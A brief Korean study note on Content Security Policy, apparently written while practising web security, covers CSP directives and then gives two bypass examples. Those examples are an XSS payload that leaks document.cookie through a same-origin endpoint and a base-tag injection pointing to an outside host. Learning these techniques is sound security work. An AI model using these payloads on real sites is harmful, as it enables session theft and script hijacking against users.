
# CSP (Content Security Policy)

XSS 공격의 피해를 줄이기 위해, 웹 페이지에 사용될 수 있는 자원의 위치, 출처 등에 제약을 건다.

- Inline Code를 사용할 수 없다.
  - CSP는 인라인 코드 형태를 지양하고, `<script src="alert.js"></script>` 와 같이 src 속성에 코드 경로를 정의하는 방식을 권장한다.
- `<script>` 태그 내에 코드를 삽입하는 것을 포함하여 on* 이벤트 핸들러 속성, javascript: URL 스킴 또한 인라인 코드로 간주하고 허용하지 않는다.

## Policy Directive

|지시문|설명|
|--|--|
|default-src|`-src`로 끝나는 모든 리소스의 기본 동작을 제어|
|img-src|이미지를 로드할 수 있는 출처를 제어|
|base-uri|페이지의 `base` 태그에 나타날 수 있는 URL을 제어|

### 에시 CSP Bypass

default-src가 self라면, 스스로가 접속하도록 유도하면 된다.

```js
<script src="/vuln?param=document.location='/memo?memo='%2bdocument.cookie"></script>
```

### 에시 CSP Bypass Advanced

base-uri 설정이 없다면, base를 바꿀 수 있다.
HTML `base` 태그는 초기경로를 설정해주며 이에따라 경로가 해석되는 기준점을 변경할 수 있다.

```js
<base href="https://cspadvanced.jaeho211.repl.co">
```